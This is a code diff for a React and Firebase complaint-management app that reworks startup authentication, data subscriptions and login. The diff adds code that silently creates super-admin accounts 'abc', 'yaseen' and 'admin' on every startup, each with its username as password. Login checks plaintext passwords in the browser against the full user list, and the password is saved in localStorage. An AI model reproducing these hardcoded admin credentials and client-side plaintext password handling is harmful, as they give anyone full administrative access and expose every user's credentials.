@@ -37,10 +37,16 @@ export default function App() {
   }, [isOnline]);
 
   const [firebaseAuthReady, setFirebaseAuthReady] = useState(false);
+  const [firebaseUser, setFirebaseUser] = useState<any>(null);
 
   const [user, setUser] = useState<UserProfile | null>(() => {
-    const savedUser = localStorage.getItem('complaint_app_user');
-    return savedUser ? JSON.parse(savedUser) : null;
+    try {
+      const savedUser = localStorage.getItem('complaint_app_user');
+      return savedUser ? JSON.parse(savedUser) : null;
+    } catch (e) {
+      console.error("Failed to parse saved user:", e);
+      return null;
+    }
   });
   const [complaints, setComplaints] = useState<Complaint[]>([]);
   const [users, setUsers] = useState<UserProfile[]>([]);
@@ -51,7 +57,7 @@ export default function App() {
     priorities: DEFAULT_PRIORITIES,
     zones: DEFAULT_ZONES
   });
-  const [isLoading, setIsLoading] = useState(false);
+  const [isLoading, setIsLoading] = useState(true); // Default to true until auth/init is done
   const [error, setError] = useState<string | null>(null);
   const [showWelcome, setShowWelcome] = useState(false);
   const [alertAuthorized, setAlertAuthorized] = useState(() => {
@@ -299,84 +305,98 @@ export default function App() {
 
   // Auto-login logic and initial data fetch
   useEffect(() => {
-    let unsubscribeConfig: (() => void) | undefined;
-    let authReady = false;
+    let unsubscribeAuth: (() => void) | undefined;
+    let initialized = false;
 
     const init = async (userAuth: any) => {
-      console.log('App: Initializing with auth status:', !!userAuth);
+      console.log('App: Initializing Data Registry...');
+      
+      // Test Firestore connection
+      firebaseService.testConnection();
       
       try {
-        const fetchTenantId = user ? firebaseService.getReadTenantId(user) : undefined;
-        const initialUsers = await firebaseService.getUsers(fetchTenantId);
-        
+        // Fetch all users to ensure bootstrap accounts exist
+        const initialUsers = await firebaseService.getUsers();
         let currentUsers = [...initialUsers];
         
-        if (!fetchTenantId || fetchTenantId === 'main') {
-          const hasAbc = currentUsers.some(u => u.username === 'abc');
-          
-          if (!hasAbc) {
-            try {
-              const abcAdmin = await firebaseService.createUser('abc-id', 'abc', 'abc', 'super_admin', 'system', 'System Bootstrap', 'main', '000');
-              currentUsers.push(abcAdmin);
-            } catch(e) {
-              console.error("Failed to inject abc user:", e);
-            }
+        // Ensure core admin accounts exist
+        const hasAbc = currentUsers.some(u => u.username.toLowerCase() === 'abc');
+        if (!hasAbc) {
+          try {
+            console.log("Bootstrapping 'abc' protocol...");
+            const abcAdmin = await firebaseService.createUser('abc-id', 'abc', 'abc', 'super_admin', 'system', 'System Bootstrap', 'main', '000');
+            currentUsers.push(abcAdmin);
+          } catch(e) {
+            console.error("Failed to inject abc user:", e);
           }
-
-          // Bootstrap first admin if no users exist
-          if (currentUsers.length === 0) {
-            try {
-              const admin = await firebaseService.createUser('admin-id', 'admin', 'admin', 'super_admin', 'system', 'System Bootstrap');
-              currentUsers.push(admin);
-            } catch (e) {
-               console.error("Failed to bootstrap admin:", e);
-            }
-          } 
         }
+
+        const hasYaseen = currentUsers.some(u => u.username.toLowerCase() === 'yaseen');
+        if (!hasYaseen) {
+          try {
+            console.log("Bootstrapping 'yaseen' protocol...");
+            const yaseenAdmin = await firebaseService.createUser('yaseen-id', 'yaseen', 'yaseen', 'super_admin', 'system', 'System Bootstrap', 'main', '000');
+            currentUsers.push(yaseenAdmin);
+          } catch(e) {
+            console.error("Failed to inject yaseen user:", e);
+          }
+        }
+
+        const hasAdmin = currentUsers.some(u => u.username.toLowerCase() === 'admin');
+        if (!hasAdmin) {
+          try {
+            console.log("Bootstrapping 'admin' protocol...");
+            const admin = await firebaseService.createUser('admin-id', 'admin', 'admin', 'super_admin', 'system', 'System Bootstrap');
+            currentUsers.push(admin);
+          } catch (e) {
+             console.error("Failed to bootstrap admin:", e);
+          }
+        } 
         
         setUsers(currentUsers);
       } catch (err) {
         console.error("Initialization error:", err instanceof Error ? err.message : String(err));
-        setError("System initialization failed. Please refresh.");
+        setError("System initialization failed. Some data may be temporarily unavailable.");
       } finally {
         setIsLoading(false);
       }
     };
 
     import('firebase/auth').then(({ onAuthStateChanged, signInAnonymously }) => {
-      const unsubscribeAuth = onAuthStateChanged(auth, (userAuth) => {
-        if (userAuth && !authReady) {
-          authReady = true;
+      unsubscribeAuth = onAuthStateChanged(auth, (userAuth) => {
+        if (userAuth) {
+          console.log('Firebase Auth: Operational session established', userAuth.uid);
+          setFirebaseUser(userAuth);
           setFirebaseAuthReady(true);
-          init(userAuth);
-        } else if (!userAuth && !authReady) {
-          // If not signed in yet, try to sign in anonymously
+          if (!initialized) {
+            initialized = true;
+            init(userAuth);
+          }
+        } else {
+          console.log('Firebase Auth: No session detected, initiating secure handshake...');
           signInAnonymously(auth).catch(authErr => {
             console.warn("Auth initialization restricted:", authErr);
-            // Even if anonymous auth fails, we should still mark ready 
-            // but init(null) will be called if as a absolute fallback 
-            // to show login screen or error
-            if (!authReady) {
-              authReady = true;
-              setFirebaseAuthReady(true);
+            setFirebaseAuthReady(true);
+            setIsLoading(false);
+            if (!initialized) {
+              initialized = true;
               init(null);
             }
           });
         }
       });
-
-      return () => unsubscribeAuth();
     });
 
     return () => {
-      if (unsubscribeConfig) unsubscribeConfig();
+      if (unsubscribeAuth) unsubscribeAuth();
     };
   }, []);
 
   // Real-time user updates for presence and management
   useEffect(() => {
-    // Only subscribe to real-time user changes when logged in
+    // Only subscribe to real-time user changes when logged in AND firebase is checked
     if (!user) return;
+    if (!firebaseAuthReady) return;
     
     const tenantId = firebaseService.getReadTenantId(user);
     
@@ -411,7 +431,7 @@ export default function App() {
       unsubscribeConfig();
       unsubscribe();
     };
-  }, [user]);
+  }, [user, firebaseAuthReady]);
 
   // Fetch complaints only when a user is logged in
   useEffect(() => {
@@ -419,19 +439,24 @@ export default function App() {
       setComplaints([]);
       return;
     }
+    if (!firebaseAuthReady) return;
     
-    const tenantId = user ? firebaseService.getReadTenantId(user) : undefined;
+    const tenantId = firebaseService.getReadTenantId(user);
     
     const unsubscribe = firebaseService.subscribeComplaints((data) => {
       setComplaints(data);
     }, tenantId);
 
     return () => unsubscribe();
-  }, [user]);
+  }, [user, firebaseAuthReady]);
 
   // Centralized Notifications Subscription
   useEffect(() => {
-    if (!user) return;
+    if (!user) {
+      setNotifications([]);
+      return;
+    }
+    if (!firebaseAuthReady) return;
     
     const tenantId = user ? firebaseService.getReadTenantId(user) : undefined;
     let isInitialLoad = true;
@@ -491,11 +516,12 @@ export default function App() {
     }, tenantId);
 
     return () => unsubscribe();
-  }, [user, alertAuthorized, isAudioMuted, notificationAudio]);
+  }, [user, firebaseAuthReady, alertAuthorized, isAudioMuted, notificationAudio]);
 
   // Global Chat Notifications
   useEffect(() => {
     if (!user) return;
+    if (!firebaseAuthReady) return;
     
     let isInitialLoad = true;
     let lastMessageId = '';
@@ -553,14 +579,20 @@ export default function App() {
     }, tenantId);
 
     return () => unsubscribe();
-  }, [user, alertAuthorized, isAudioMuted]);
+  }, [user, firebaseAuthReady, alertAuthorized, isAudioMuted, chatAudio]);
 
   const handleLogin = async (username: string, pass: string, lineCode?: string) => {
     setIsLoading(true);
     setError(null);
     try {
-      let dealerId: string | undefined = undefined;
       let effectiveUsers = users;
+
+      // If user list is empty, fetch immediately to prevent login blackout
+      if (effectiveUsers.length === 0) {
+        console.log("Registry empty, performing hot fetch for login validation...");
+        effectiveUsers = await firebaseService.getUsers();
+        setUsers(effectiveUsers);
+      }
 
       // If a line code is provided, we need to validate it first
       if (lineCode) {
@@ -571,28 +603,29 @@ export default function App() {
           return;
         }
         
-        if (networkOwner.role === 'super_admin') {
-           effectiveUsers = [networkOwner];
-        } else {
-           dealerId = networkOwner.uid;
-           // Fetch users specifically for this dealer's network and include the dealer themselves
+        if (networkOwner.role !== 'super_admin') {
+           // For non-super admins, check if the username exists in THEIR network
+           const dealerId = networkOwner.uid;
            const networkUsers = await firebaseService.getUsers(dealerId);
            effectiveUsers = [networkOwner, ...networkUsers];
+        } else {
+           // Super admins see all users already in effectiveUsers
         }
       }
 
-      const foundUser = effectiveUsers.find(u => u.username.toLowerCase() === username.toLowerCase());
+      const foundUser = effectiveUsers.find(u => u.username.toLowerCase() === username.trim().toLowerCase());
       
       if (foundUser && foundUser.password === pass) {
         setUser(foundUser);
         localStorage.setItem('complaint_app_user', safeStringify(foundUser));
         setShowWelcome(true);
-        toast.success(`Welcome back, ${foundUser.username}`);
+        toast.success(`Access Granted: Welcome back, ${foundUser.username}`);
       } else {
-        setError('Invalid username or password');
+        setError('Invalid Identity Credentials. Access Denied.');
       }
     } catch (e) {
-      setError('Login failed. Please verify credentials.');
+      console.error("Login sequence failure:", e);
+      setError('System authentication failure. Please verify network connectivity.');
     } finally {
       setIsLoading(false);
     }
@@ -724,14 +757,14 @@ export default function App() {
     }
   };
 
-  const handleUpdateUser = async (uid: string, username: string, pass: string) => {
+  const handleUpdateUser = async (uid: string, username: string, pass: string, lineCode?: string) => {
     if (!user) return;
     try {
-      await firebaseService.updateUser(uid, { username, password: pass }, user.username);
+      await firebaseService.updateUser(uid, { username, password: pass, ...(lineCode && { lineCode }) }, user.username);
       
       // If updating self, update local user state too
       if (user && user.uid === uid) {
-        const updatedUser = { ...user, username, password: pass };
+        const updatedUser = { ...user, username, password: pass, ...(lineCode && { lineCode }) };
         setUser(updatedUser);
         localStorage.setItem('complaint_app_user', safeStringify(updatedUser));
       }
